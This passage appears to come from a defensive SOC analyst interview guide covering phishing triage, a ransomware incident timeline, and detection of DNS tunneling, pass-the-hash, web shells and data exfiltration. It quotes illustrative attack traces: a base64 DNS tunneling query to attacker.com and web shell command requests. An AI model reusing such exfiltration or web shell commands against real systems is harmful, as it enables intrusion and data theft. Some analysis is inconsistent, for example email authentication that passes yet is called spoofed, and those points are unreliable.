- Monitor logon type changes (normal logon vs service logon).
- Monitor for Kerberos delegation abuse (request for TGT for sensitive service).

---

## Phishing \& Social Engineering Q\&A

### Q32: Analyze a phishing email; decide whether to escalate.

**Answer**:

```
Email Received:
  From: updates@microsoft.com
  Subject: "Urgent: Windows 10 Security Update"
  Body: "Click here to install critical security patch."
  Link: "https://microsoft-updates.info/patch"

ANALYSIS:

Step 1: Sender Authentication
  - Domain: microsoft.com? Check.
  - Sub-check: updates@microsoft.com (mailbox, not subdomain).
  - Reverse: Look up microsoft.com WHOIS → legitimate?
  - SPF/DKIM/DMARC check:
    spf=PASS (email from legitimate Microsoft IP)
    dkim=PASS (signature valid)
    dmarc=PASS (aligned)
  - Wait, all pass? Suspicious (attacker spoofed domain or compromised account).

Step 2: Link Analysis
  - Display text: "Click here"
  - Actual URL: https://microsoft-updates.info/patch
  - Domain: microsoft-updates.info (NOT microsoft.com) ← RED FLAG!
  - Typo attack: users might not notice "updates.info" vs "microsoft.com"
  - URL reputation check: malicious.com? Phishing kit detected? → YES

Step 3: Content Analysis
  - Generic greeting ("No recipient name mentioned") → likely mass phishing.
  - Urgency ("Critical update") → pressure tactic.
  - Action button → trick to click link.

Step 4: Timeline Context
  - Is Windows 10 security update due? (Check Microsoft calendar)
  - Do Microsoft update emails normally come from this address? (Check past emails)

VERDICT: HIGH-CONFIDENCE PHISHING
  - Spoofed Microsoft domain
  - Attacker domain (microsoft-updates.info)
  - Pressure tactic
  - Generic content

ACTION:
  - Block sender's domain (microsoft-updates.info)
  - Add to email filter blocklist
  - Notify users (don't click)
  - Check if anyone clicked; if so, scan their device
```


### Q33: A user reports: "I think I got phished. What do I do?"

**Answer**:

```
Step 1: Reassure
  - "Thank you for reporting; you did the right thing."
  - "Don't panic; we'll investigate."

Step 2: Immediate Actions
  - "Stop using that device until we check it."
  - "Don't click any more links from that email."
  - "We'll need your password reset soon."

Step 3: Investigation (SOC)
  - Get email details: Sender, timestamp, subject, link.
  - Check email headers (SPF/DKIM/DMARC).
  - Look up link in VirusTotal/URLhaus.
  - Check user's mail logs (any logins from unusual location?).
  - Check user's workstation (malware scan, file integrity).
  - Check if email bounced (valid recipient?) or if user was targeted specifically.

Step 4: Damage Assessment
  - Did user click link? If yes:
    * What happened? Did page load? Did user enter credentials?
    * Is browser showing malware warning?
    * Did any file download?
  - Did user enter credentials? If yes:
    * On attacker's site or legitimate site?
    * If attacker's site → credentials compromised.
    * If legitimate site (MITM attack) → monitor for unauthorized access.

Step 5: Response
  - If credentials entered on attacker site:
    * Force immediate password reset.
    * Enable MFA if not already.
    * Monitor account for 48 hours (logins, access patterns).
    * If admin account → full investigation.
  - If malware detected:
    * Isolate workstation; run full antivirus scan.
    * Check for C2 connections.
  - If no damage:
    * Monitor anyway; educate user.

Step 6: Post-Incident
  - Block phishing domain/sender at firewall + email gateway.
  - Send org-wide alert (low-key; don't blame user).
  - Update security awareness training.
  - Document case for future reference.
```


---

## Scenario: Real-World Incident

### Q34: Incident Scenario—"Ransomware Detected on File Server"

**Alert**: "Suspicious encryption activity detected on file server \\fs-main."

```
TIMELINE & INVESTIGATION:

T+0 (Alert Received):
  - EDR alert: ransomware.exe detected on file server.
  - Alert severity: CRITICAL.
  - Immediate action: Isolate server (disconnect from network).

T+5 min:
  - Check SIEM for related alerts preceding ransomware:
    * 10:15 AM: Successful logon to \\fs-main from 192.168.1.50 using admin account "svc_backup"
    * 10:20 AM: powershell.exe spawned from explorer.exe (unusual)
    * 10:25 AM: File modification spike (thousands of files modified in 2 minutes)
    * 10:28 AM: Ransomware.exe created in C:\Temp
    * 10:30 AM: File encryption detected (system logs: .LOCKED extension added to files)

T+15 min:
  - Investigate svc_backup account:
    * Check: Is this a service account? (Yes, used for backup software)
    * Check: Who has access to this account? (Password shared with Backup Admin team)
    * Check: Password last changed? (3 months ago)
    * Risk: Backup admin's password may be compromised.

T+20 min:
  - Investigate 192.168.1.50 (source IP):
    * Check inventory: 192.168.1.50 = BACKUP_SERVER (legitimate)
    * Check EDR on BACKUP_SERVER:
      - Multiple admin tool invocations (net.exe, psexec, PowerShell scripts)
      - Lateral movement attempts to other servers
      - Mimikatz-like process behavior (credential dump)
    * Conclusion: BACKUP_SERVER compromised; attacker used it to pivot.

T+30 min:
  - Investigate BACKUP_SERVER compromise:
    * When was it compromised?
    * How did attacker get in?
    * Check logs: Last logon? Failed attempts? Software vulnerabilities?

HYPOTHESIS:
  1. Attacker compromised BACKUP_SERVER (phishing? unpatched vuln?).
  2. Attacker extracted svc_backup credentials from BACKUP_SERVER.
  3. Attacker used svc_backup to access file server.
  4. Attacker deployed ransomware; encrypted files.

IMMEDIATE ACTIONS:
  1. Isolate \\fs-main (done).
  2. Isolate BACKUP_SERVER (disconnect from network).
  3. Force password reset for svc_backup + all admins.
  4. Scan all servers for similar lateral movement patterns.
  5. Check backups: Are they clean (before encryption)?
  6. Disable affected accounts pending investigation.

ESCALATION:
  - Notify incident response team.
  - Alert management (business impact assessment).
  - Prepare legal/law enforcement notification (if required).
  - Activate business continuity plan (recovery from backup).

ERADICATION:
  - Remove ransomware from all systems.
  - Close exploitation vector (patch BACKUP_SERVER vulnerability? Change poor password practices?).
  - Verify network segmentation (file server shouldn't be accessible from backup server without approval).

RECOVERY:
  - Restore files from clean backup (before encryption timestamp).
  - Verify no persistence (malware removed, backdoors closed).
  - Restore network connectivity.

FORENSICS / ROOT CAUSE:
  - Why was BACKUP_SERVER vulnerable?
  - Why was svc_backup password shared?
  - Why wasn't file server segmented from backup server?
  - Why did ransomware get to execute?

POST-INCIDENT:
  - Improve:
    * Network segmentation (file servers on isolated VLAN).
    * Credential management (PAM for service accounts).
    * Backup integrity (immutable snapshots; offsite copies).
    * Detection (behavioral analytics for ransomware; file encryption patterns).
  - Share IOCs: Ransomware hash, C2 domains, attacker IP.
  - Train team on incident; incorporate lessons.
```


---

## Additional Scenario-Based Q\&A

### Q35: Detect DNS Tunneling – What are red flags?

**Answer**:

- **Scenario**: Attacker exfiltrates data via DNS queries (encodes data in subdomain names).
- **Red Flags**:

1. **Unusually long DNS queries**: Normal: `google.com`. Tunnel: `SGVsbG8gV29ybGRkYXRhYmFzZQ.attacker.com` (base64).
2. **High DNS query volume from single workstation**: Normal user: 100 DNS queries/day. Malware tunneling: 10,000 queries/day.
3. **Requests to non-existent domains**: Attacker-controlled nameserver (tunnel endpoint).
4. **Suspicious domain patterns**: Random subdomains changing rapidly (DGA-like).
5. **DNS to unusual external IP**: Nameserver not recognized; reverse DNS resolution shows attacker domain.

**Detection (SIEM)**:

```
| where sourcetype="dns"
| stats count by query_domain
| where count > 1000
| search NOT query_domain IN (known_good_domains)
| alert "Possible DNS tunneling from [source_ip]"
```

**Response**:

- Block attacker.com at DNS firewall.
- Scan workstation for malware (likely tunnel client).
- Check for data exfiltration (what was sent?).

---

### Q36: Lateral Movement via Pass-the-Hash – Detect \& Respond.

**Answer**:

- **Attack**: Attacker steals NTLM hash of Domain Admin; uses hash to access other servers without password.
- **Red Flag**: Logon via NTLM from unexpected source.
    - Normal: User logs in with Kerberos.
    - Attack: Attacker logs in with NTLM (doesn't have password; only hash).

**Detection (Event Logs)**:

- Event 4624 (logon) with Logon Type = 3 (network) + Authentication Package = NTLM (not Kerberos).
- For admin account at unusual time/location.

**Example**:

```
Event 4624:
  Account: Domain Admin
  Logon Type: 3 (network)
  Auth Package: NTLM
  Source IP: 10.0.0.50 (attacker-controlled box)
  Time: 3 AM (unusual)
  
Alert: "Admin login via NTLM from unusual IP/time"
```

**Response**:

1. Isolate attacker-controlled box (10.0.0.50).
2. Force password reset for Domain Admin.
3. Invalidate all Kerberos tickets (reboot domain controller? Or revoke TGT).
4. Check for persistence (backdoor accounts? Scheduled tasks?).
5. Scan all servers accessed by Domain Admin in last 24 hours (attacker may have used admin access to install malware).

---

### Q37: Detect Web Shell on Web Server – What to look for?

**Answer**:

- **Web Shell**: Small script (PHP, ASP, JSP) left on web server by attacker for backdoor access.
- **Example**: attacker.php (50 bytes) allowing attacker to execute commands.

**Red Flags**:

1. **File in unexpected location**: `/var/www/html/attacker.php` (web-accessible).
2. **Recent creation**: File created timestamp recent; older files are normal.
3. **Unusual filename**: `shell.php`, `cmd.php`, `admin.php`, `test.php` (not part of app).
4. **Small file size**: Shells are tiny (50-500 bytes vs normal app files 10+ KB).
5. **Weird permissions**: World-writable (chmod 777) to allow attacker modifications.
6. **No owner in version control**: File not tracked in git/SVN; unknown who created it.

**Access Pattern**:

- Web server logs show POST/GET requests to shell.php with command parameters.
- Example: `GET /shell.php?cmd=ls` → attacker listing files.
- Unusual activity (executing system commands, not serving web content).

**Detection (File Integrity Monitoring)**:

```
File created: /var/www/html/shell.php
  Size: 234 bytes
  Permissions: 644
  Owner: www-data
  Alert: Suspicious file in web root
```

**Detection (Web Server Logs)**:

```
192.168.1.50 - - [timestamp] "GET /shell.php?cmd=id HTTP/1.1" 200 120
192.168.1.50 - - [timestamp] "GET /shell.php?cmd=whoami HTTP/1.1" 200 50
```

**Response**:

1. Quarantine web server (take offline).
2. Preserve shell.php for analysis.
3. Check how shell was uploaded (vulnerable file upload? RCE exploit?).
4. Search for other shells (pattern: *.php in web root with recent timestamps).
5. Check for malware (shells often paired with backdoor malware).
6. Patch vulnerability; harden web server.

---

### Q38: Detect Data Exfiltration – Red Flags \& Response.

**Answer**:

- **Scenario**: Employee or insider downloads sensitive files to external device.

**Red Flags**:

1. **Large outbound transfer**: 10 GB download in 1 hour (abnormal).
2. **Unusual destination**: Upload to personal cloud (Dropbox, Google Drive) or external IP.
3. **Off-hours activity**: Transfer at 2 AM on weekday (unusual for that user).
4. **Compression before transfer**: Files zipped → single large file uploaded (indicates intent to hide).
5. **VPN/Proxy use**: User suddenly using VPN (hiding traffic).
6. **High-risk file types**: Database dumps (.bak), entire folder archives (.tar, .zip).
7. **DLP alert**: Data Loss Prevention system flags sensitive data (PII, confidential) leaving network.

**Detection (Network/SIEM)**:

```
Outbound traffic from [user] to [external_ip]:
  Volume: 5 GB
  Duration: 30 min
  Time: 2:15 AM
  Destination reputation: suspicious
  Protocol: HTTPS (encrypted; can't inspect content)
  
Alert: Possible data exfiltration
```

**Detection (DLP)**:

```
DLP alert: Sensitive data detected in outbound email
  Pattern: SSN (XXX-XX-XXXX), Credit card (XXXX-XXXX-XXXX-XXXX)
  File: customer_list.xlsx
  Destination: personal.gmail.com
  Action: Block email; alert user; escalate
```

**Response**:

1. **Immediate**:
    - Revoke user's credentials (prevent further access).
    - Block external IP at firewall.
    - Preserve logs (network capture, endpoint logs).
2. **Investigation**:
    - Interview user (was this intentional? Accident?).
    - Determine what data was exfiltrated.
    - Check if malware involved (trojan stealing files?) or intentional (insider threat).
    - Check user's access history (what files did they access before exfil?).
3. **Damage Assessment**:
    - Is data sensitive? (PII? Trade secrets? Financial?)
    - Who is affected? (Customers? Employees?)
    - Legal obligation to notify? (GDPR, CCPA, SOX).
4. **Response**:
    - If insider threat: Involve legal, HR, management.
    - If malware: Full incident response (find malware, remove, scan).
    - Notify affected parties (if required).
    - Review access controls (why did user have access to that data?).

---

## Summary of Key Takeaways (SOC L1 Essentials)

1. **CIA Triad**: Confidentiality (encryption), Integrity (hashing), Availability (redundancy, DDoS mitigation).
2. **AAA Model**: Authentication (MFA), Authorization (RBAC), Accountability (logging, auditing).
3. **Networking**: TCP (reliable, connection-oriented), UDP (fast, connectionless). SSH replaces Telnet (encryption).
4. **Ports**: FTP 20/21 (plaintext), SSH 22 (encrypted), DNS 53, HTTP 80, HTTPS 443, SMB 445, RDP 3389.
5. **DNS**: Resolution process; SPF/DKIM/DMARC prevent email spoofing; DNS tunneling exfiltrates data.
6. **Email Security**: SPF (checks IP), DKIM (signs message), DMARC (policy).
7. **Cryptography**: Hash (one-way, passwords), Encryption (two-way, TLS). PKI = trust infrastructure.
8. **Web Security**: OWASP Top 10; SQLi (prepared statements), XSS (output encoding), CSRF (tokens), Open Redirect (whitelist).
9. **Malware**: Classification (virus, worm, trojan, ransomware), IOCs (hash, IP, domain), LoTL (PowerShell, cmd, WMI).
10. **Kill Chain**: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives.
11. **MITRE ATT\&CK**: Tactics (goals) → Techniques (how) → Sub-Techniques (variations). Map alerts to tactics.
12. **Pyramid of Pain**: Hash (easy to change) → IPs → Domains → Patterns → Tools → TTPs (hard to change). Invest in TTP detection.
13. **IR**: Detection → Containment → Eradication → Recovery → Post-Incident.
14. **AD**: Users, Groups, Computers, OUs, GPOs. Kerberos (tickets, time-limited) vs NTLM (hash-based, weak). Monitor for privilege escalation, pass-the-hash, credential theft.
15. **SOC L1 Focus**: Alert triage, SIEM queries, escalation, threat intel. Not deep forensics/rule writing (those are L2/L3).



